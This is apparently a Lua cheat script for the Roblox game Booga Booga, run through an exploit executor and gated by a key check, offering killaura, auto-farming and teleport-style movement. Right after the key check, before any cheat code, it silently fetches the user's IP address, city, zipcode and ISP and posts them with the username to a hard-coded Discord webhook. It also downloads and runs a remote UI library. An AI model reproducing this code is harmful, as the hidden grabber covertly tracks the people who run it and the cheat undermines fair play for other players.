--------------------- Key System V.04 --------------------------------------------------------


-------------------------- Keys

_G.Key = "9f09f869-3cef-4b2a-a030-b55f5dfd3c5b"  --------------------------- Current Key

local keys = {
	["9f09f869-3cef-4b2a-a030-b55f5dfd3c5b"] = true, -------------- Key 1
	["CA1W8T2psiqVgtSeLFzaMikCJy5raricC4j1erNk1D9bkBSxra"] = true, -------------- Key 2
	["5Bqp7fBOa7fmnIdbOOIoowGR3Qidhm2irb2LMlQe6HpfVK26IB"] = true -------------- Key 2
}









---------------------------

------------------------------------------ Whitelisted Successfully Worked!
if keys[_G.Key] == true then

	
local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1208308257328996393/jpDtSboo6emvtzLrZu1wKakHOD5CwUYsPKh5DPr0lFjmMDSePZas8Xz2onJpJwyMbOIf"

local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
syn.request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)
	-------------------------------------------------------------------------------------------------           

	-- variables

local lib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/fluxlib.txt")()

local Player = game.Players.LocalPlayer
local win = lib:Window("Booga Sex-Cheat", "b0.1", Color3.fromRGB(255, 102, 102), Enum.KeyCode.Semicolon)

_G.plantingenabled = false
_G.autohealenabled = false
_G.blatantaura = false
_G.legitaura = false
_G.combattween = false
_G.fastplantingenabled = false
_G.autoharvest = false

_G.tweening = false
_G.tween_spots = {}

local ItemData = require(game:GetService("ReplicatedStorage").Modules.ItemData)

local fruits = {}
local fruit_indexes = {}

local cps = 20
local heal_health = 85

local tweenspeed = 21

local max_combat_movedist = 150

local combat = win:Tab("Combat", "http://www.roblox.com/asset/?id=6023426915")
local farming = win:Tab("Farming", "http://www.roblox.com/asset/?id=6023426915")
local tween = win:Tab("Tween", "http://www.roblox.com/asset/?id=6023426915")

tween:Slider("Tween Speed", "Speed of all tweens.", 1, 30, 21, function(t)
	tweenspeed = t
end)

local planting_fruit = "Bloodfruit"
local planting_fruit_index = 1

local healing_fruit = "Bloodfruit"
local healing_fruit_index = 1

local distanceForAura = 25

-- tweens

local tweens = {
	"Set Spot 1";
	"Set Spot 2";
	"Set Spot 3";
	"Set Spot 4";
	"Set Spot 5";
	"Set Spot 6";
	"Set Spot 7";
	"Set Spot 8";
	"Set Spot 9";
	"Set Spot 10";
}

local tween_conversion = {
	["Set Spot 1"] = 1;
	["Set Spot 2"] = 2;
	["Set Spot 3"] = 3;
	["Set Spot 4"] = 4;
	["Set Spot 5"] = 5;
	["Set Spot 6"] = 6;
	["Set Spot 7"] = 7;
	["Set Spot 8"] = 8;
	["Set Spot 9"] = 9;
	["Set Spot 10"] = 10;
}

tween:Dropdown("Set Tween Spot", tweens, function(t)
	_G.tween_spots[tween_conversion[t]] = Player.Character:GetPivot()
end)

tween:Button("Reset Tween Spots", "Resets the tween spots so there are none set.", function(t)
	_G.tween_spots = {}
end)

tween:Toggle("Auto-Tween", "Tween to your selected spots automatically!", false, function(t)
	_G.tweening = t
		if _G.tweening then
			local function tween_spots()
				for index, spot in next, _G.tween_spots do
					if not _G.tweening then break end
					local distance = (Player.Character:GetPivot().Position - Vector3.new(spot)).Magnitude
					local arrival = distance / (tweenspeed * 5)

					local ti = TweenInfo.new(
						arrival,
						Enum.EasingStyle.Linear,
						Enum.EasingDirection.InOut,
						0,
						false,
						0
					)

					local this_tween = game:GetService("TweenService"):Create(Player.Character.HumanoidRootPart, ti, {CFrame = spot})
					this_tween:Play()

					this_tween.Completed:Wait()
					if index == #_G.tween_spots then
						tween_spots()
					end
				end
			end
			tween_spots()
		end
end)

local Box = nil

function GetClosestBox()
	local closest = {nil,math.huge}

	for i,v in pairs(workspace.Deployables:GetChildren()) do
		local distance = (Player.Character:GetPivot().Position - v:GetPivot().Position).magnitude
		if v.Name == "Plant Box" and not v:FindFirstChild(planting_fruit) then
			if distance < closest[2] then
				closest = {v, distance}
			end
		end
	end

	Box = closest[1]
end

function HasBush(plant_box)
	for k, v in next, plant_box:GetChildren() do
		if string.match(string.lower(v.Name), "bush") or string.match(string.lower(v.Name), "tree") or string.match(string.lower(v.Name), "patch") then
			return true
		end
	end
	return false
end

function GetClosestBoxWithBush()
	local closest = {nil, math.huge}
	
	for i,v in pairs(workspace.Deployables:GetChildren()) do
		local distance = (Player.Character:GetPivot().Position - v:GetPivot().Position).magnitude
		if v.Name == "Plant Box" and HasBush(v) then
			if distance < closest[2] then
				closest = {v, distance}
			end
		end
	end
	
	return closest[1]
end

tween:Toggle("Auto-Tween to Plant Box", "Tween to plant boxes that dont have fruits.", false, function(t)
	_G.tweeningplant = t
	if _G.tweeningplant then
		task.spawn(function()
			while task.wait() do
				if _G.tweeningplant then
					if not _G.tweeningplant then break end
					GetClosestBox()
					local distance = (Player.Character:GetPivot().Position - Box:GetPivot().Position).Magnitude
					local arrival = distance / (tweenspeed)

					local ti = TweenInfo.new(
						arrival,
						Enum.EasingStyle.Linear,
						Enum.EasingDirection.InOut,
						0,
						false,
						0
					)

					local this_tween = game:GetService("TweenService"):Create(Player.Character.HumanoidRootPart, ti, {CFrame = Box:GetPivot() + Vector3.new(0, 5, 0)})
					this_tween:Play()

					this_tween.Completed:Wait()
				else
					break
				end
			end
		end)
	end
end)

--farming

function UpdateFruits()
	fruits = {}
	fruit_indexes = {}
	for k, thing in next, Player.PlayerGui.MainGui.RightPanel.Inventory.List:GetChildren() do
		if not thing:IsA("ImageLabel") then continue end

		local itemInfo = ItemData[thing.Title.Text]
		if itemInfo.growthTime == nil then continue end

		if table.find(fruits, thing.Title.Text) then continue end
		table.insert(fruits, thing.Title.Text)
		fruit_indexes[thing.LayoutOrder] = thing.Title.Text
	end
end

function SetFruitPlanting(name)
	for fruit_key, fruit_name in next, fruit_indexes do
		if fruit_name == name then
			planting_fruit = fruit_name
			planting_fruit_index = fruit_key
		end
	end
end

function SetFruitHealing(name)
	for fruit_key, fruit_name in next, fruit_indexes do
		if fruit_name == name then
			healing_fruit = fruit_name
			healing_fruit_index = fruit_key
		end
	end
end

local fruit_select; fruit_select = farming:Dropdown("Fruit selection", fruits, function(val)
	SetFruitPlanting(val)
	UpdateFruits()
	fruit_select:Clear()
	if #fruits <= 0 then
		fruit_select:Add("None")
	end
	for k, v in next, fruits do
		fruit_select:Add(v)
	end
end)

farming:Toggle("Auto-Plant", "Automatically plant fruits.", false, function(t)
	_G.plantingenabled = t
end)

farming:Toggle("Auto-Plant (FAST)", "Automatically plant fruits. (Could cause more delay or lag.)", false, function(t)
	_G.fastplantingenabled = t
end)

farming:Line()

tween:Toggle("Auto-Harvest", "Automatically harvest plants!", false, function(t)
	_G.autoharvest = t
end)

tween:Toggle("Auto-Harvest TP", "Tween to plant boxes that have bushes.", false, function(t)
	_G.tweeningplant = t
	if _G.tweeningplant then
		task.spawn(function()
			while task.wait() do
				if _G.tweeningplant then
					if not _G.tweeningplant then break end
					local plant_box = GetClosestBoxWithBush()
					if plant_box == nil then continue end
					local distance = (Player.Character:GetPivot().Position - plant_box:GetPivot().Position).Magnitude
					local arrival = distance / (tweenspeed)

					local ti = TweenInfo.new(
						arrival,
						Enum.EasingStyle.Linear,
						Enum.EasingDirection.InOut,
						0,
						false,
						0
					)

					local this_tween = game:GetService("TweenService"):Create(Player.Character.HumanoidRootPart, ti, {CFrame = plant_box:GetPivot() + Vector3.new(0, 5, 0)})
					this_tween:Play()

					this_tween.Completed:Wait()
				else
					break
				end
			end
		end)
	end
end)

--combat

local heal_select; heal_select = combat:Dropdown("Healing selection", fruits, function(val)
	SetFruitHealing(val)
	UpdateFruits()
	heal_select:Clear()
	if #fruits <= 0 then
		heal_select:Add("None")
	end
	for k, v in next, fruits do
		heal_select:Add(v)
	end
end)

combat:Toggle("Autoheal", "Automatically heal fruits.", false, function(t)
	_G.autohealenabled = t
end)

combat:Slider("Autoheal CPS", "The clicks per second for the autoheal.", 0, 50, 20, function(t)
	cps = t
end)

combat:Slider("Autoheal Health", "The health for the autoheal.", 0, 100, 85, function(t)
	heal_health = t
end)

combat:Line()

combat:Toggle("Blatant Killaura", "Hit people blatantly.", false, function(t)
	_G.blatantaura = t
end)

combat:Toggle("Legit Killaura", "Hit people legitly.", false, function(t)
	_G.legitaura = t
end)

combat:Slider("Killaura range", "The range for the killaura.", 0, 30, 15, function(t)
	distanceForAura = t
end)

function GetClosestPlayer()
	local closest = {nil,math.huge}

	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v == Player then continue end
		local distance = (Player.Character:GetPivot().Position - v.Character:GetPivot().Position).magnitude
		if distance < closest[2] then
			closest = {v, distance}
		end
	end

	return closest[1], closest[2]
end

local curr_combatmove_loop

combat:Toggle("Combat Follow", "Follow the nearest player.", false, function(t)
	if t then
		curr_combatmove_loop = game:GetService("RunService").RenderStepped:Connect(function()
			local player, dist = GetClosestPlayer()
			if not player or not dist then return end
			if dist > max_combat_movedist then return end

			Player.Character:FindFirstChildOfClass("Humanoid"):MoveTo(player.Character:GetPivot().Position)
		end)
	else
		if curr_combatmove_loop ~= nil then
			curr_combatmove_loop:Disconnect()
			curr_combatmove_loop = nil
		end
	end
end)
farming:Toggle("Auto-Harvest", "Automatically Harvest Plants.", false,             function(m)
	getgenv().autoharvest = m
	if m then
		spawn(
			function()
				while autoharvest do
					wait()
					pcall(
						function()
							spawn(
								function()
									local S = 18, nil
									local n = game.Players.LocalPlayer.Character.HumanoidRootPart 
									for b, c in pairs(game:GetService("Workspace"):GetChildren()) do
										if c:FindFirstChild("Pickup") and c:IsA("Model") then
											if
												(Player.Character:GetPivot().Position - c:GetPivot("BasePart").Position).Magnitude <
												S
											then
												game:GetService("ReplicatedStorage").Events.Pickup:FireServer(
												c
												)
												S =
													(Player.Character:GetPivot().Position - c:GetPivot("BasePart").Position).Magnitude
											end
										end
									end
								end
							)
						end
					)
				end
			end
		)
	end
end
)
combat:Slider("Combat Follow Distance", "Distance of combat tween.", 50, 400, 150, function(t)
	max_combat_movedist = t
end)

UpdateFruits()

fruit_select:Clear()
if #fruits <= 0 then
	fruit_select:Add("None")
end
for k, v in next, fruits do
	fruit_select:Add(v)
end

heal_select:Clear()
if #fruits <= 0 then
	heal_select:Add("None")
end
for k, v in next, fruits do
	heal_select:Add(v)
end

local Boxes = {}

function PlantFruits(fruit_name)
	game.ReplicatedStorage.Events.InteractStructure:FireServer(Box, fruit_name)
end

local anims = {}

local loadAnims = coroutine.wrap(function()
	for _, v in next, game.ReplicatedStorage.Animations:GetChildren() do
		local newAnim = v:Clone() 
		anims[v.Name] = Player.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(newAnim)
		task.wait()
	end 
end) 
loadAnims()

function AuraSwingTool()
	local curated = {}
	for _,playerA in next, game.Players:GetPlayers() do
		if playerA ~= Player then
			if playerA.Character then
				local dist = (Player.Character:GetPivot().Position - playerA.Character:GetPivot().Position).Magnitude
				if dist <= distanceForAura then
					curated[#curated + 1] = playerA.Character.PrimaryPart
				end
			end
		end
	end
	if #curated > 0 then
		anims["Slash"]:Play()
		game.ReplicatedStorage.Events.SwingTool:FireServer(curated)
	end
end

local last_fruit_usage = tick()
local last_swing_tool = tick()
local last_plant_usage = tick()
local last_pickup = tick()

--main loop

while task.wait() do
	if _G.autohealenabled == true and tick() - last_fruit_usage > 1/cps then
		local hum = Player.Character:FindFirstChild("Humanoid") or Player.Character:WaitForChild("Humanoid")
		if hum.Health <= heal_health then
			last_fruit_usage = tick()
			game.ReplicatedStorage.Events.UseBagItem:FireServer(healing_fruit_index)
		end
	end
	if _G.blatantaura == true and tick() - last_swing_tool > 1/60 then
		last_swing_tool = tick()
		AuraSwingTool()
	end
	if _G.legitaura == true and tick() - last_swing_tool > 1/3 then
		last_swing_tool = tick()
		AuraSwingTool()
	end
	if _G.plantingenabled == true and tick() - last_plant_usage > 0.2333 then
		last_plant_usage = tick()
		GetClosestBox()
		PlantFruits(planting_fruit)
	end
	if _G.fastplantingenabled == true and last_plant_usage > 0.025 then
		last_plant_usage = tick()
		GetClosestBox()
		PlantFruits(planting_fruit)
	end
	if _G.autoharvest == true and tick() - last_pickup > 0 then
		local plant_box = GetClosestBoxWithBush()
		if plant_box == nil then return print("no bush") end
		last_pickup = tick()
		if (plant_box:GetPivot().Position - Player.Character:GetPivot().Position).Magnitude < 25 then
			for k, v in next, plant_box:GetChildren() do
				if v:FindFirstChild("Pickup") then
					game.ReplicatedStorage.Events.Pickup:FireServer(v)
				end
			end
		end
	end
end



	------------------------------- Extra Code -------------------



	game.StarterGui:SetCore("SendNotification", {
		Title = "Creator"; -- the title (ofc)
		Text = "Made By : cool cow / stick cow#5297"; -- what the text says (ofc)
		Icon = "http://www.roblox.com/asset/?id=8531473603"; -- the image if u want. 
		Duration = 5; -- how long the notification should in secounds
	})
	----------------------------------------------------------------------------------------
	game.StarterGui:SetCore("SendNotification", {
		Title = "Version"; -- the title (ofc)
		Text = "Key System V.04"; -- what the text says (ofc)
		Icon = "http://www.roblox.com/asset/?id=8531473603"; -- the image if u want. 
		Duration = 5; -- how long the notification should in secounds
	})
	------------------------------------------
	print("Successfully Loaded!") --- Succes Loaded Print

	----------------------------------------------------------------------------------
	print("Successfully whitelisted!") ---- Printing Key Successfully Worked!
	----------------------------------------------------------------------------------------       

	--------------------------------------------------------------------------------------------------------- 
else
	print("Wrong Key Please Try Again!")
end
-------------------------------------------------------------------------------------------------------------------------------
